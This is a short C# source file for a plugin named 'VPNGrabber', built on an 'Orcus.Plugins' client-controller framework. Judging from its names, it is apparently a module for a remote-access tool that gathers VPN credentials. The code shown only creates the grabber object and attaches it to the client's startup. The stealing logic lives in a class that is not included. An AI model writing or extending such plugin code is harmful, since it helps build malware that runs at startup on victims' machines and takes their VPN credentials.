using Orcus.Plugins;

namespace VPNGrabber
{
    public class Plugin : ClientController
    {
        private VPNGrabber _vpnGrabber;

        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            _vpnGrabber = new VPNGrabber();
            return _vpnGrabber.InfluenceStartup(clientStartup);
        }

    }
}